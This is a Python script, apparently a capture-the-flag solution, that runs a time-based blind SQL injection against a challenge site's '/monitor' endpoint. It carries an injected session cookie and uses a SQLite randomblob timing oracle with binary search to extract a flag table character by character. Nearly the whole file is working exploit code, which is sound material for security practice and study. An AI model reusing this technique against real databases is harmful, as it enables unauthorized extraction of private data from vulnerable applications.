import requests
import time


URI = 'https://fishsite-589b29b53d65ca06.challenges.2025.vuwctf.com/monitor'
SESSION = 'eyJ1c2VybmFtZSI6Iicgb3IgMTsgLS0ifQ.aTj2YQ.FhEUFXolRBIDlNZXi9nqromHNj8'
THRESH = 0.8


def post(query):
    t0 = time.monotonic()
    response = requests.post(URI, data={'query': query}, cookies={'session': SESSION})
    response.raise_for_status()
    duration = time.monotonic() - t0
    if 'Successful process' in response.text:
        ok = True
    elif 'Invalid query' in response.text:
        ok = False
    else:
        assert False
    return ok, duration


def timing_oracle_query(boolean_test):
    return f"select case when ({boolean_test}) then 1 else 1337=like('abcdefg',upper(hex(randomblob(5_000_000/2)))) end;"


def timing_oracle(query):
    ok, duration = post(timing_oracle_query(query))
    return duration < THRESH


def is_prefix_query(string):
    return f"select substr((select * from flag), 1, {len(string)}) = '{string}'"


def is_prefix(string):
    return timing_oracle(is_prefix_query(string))


def bin_search(is_goal_leq, low, upr):
    while low < upr:
        mid = (low + upr) // 2
        if is_goal_leq(mid):
            upr = mid
        else:
            low = mid + 1
    return low


def flag_bin_search(index):
    def is_goal_leq(n):
        query = f"select substr((select * from flag), {index + 1}, 1) <= '{chr(n)}' from flag"
        print(query)
        goal_is_leq_n = timing_oracle(query)
        if goal_is_leq_n:
            print(f'char at pos {index} is <=', n)
        else:
            print(f'char at pos {index} is >', n)
        return goal_is_leq_n
    return chr(bin_search(is_goal_leq, 0x14, 0x7e))
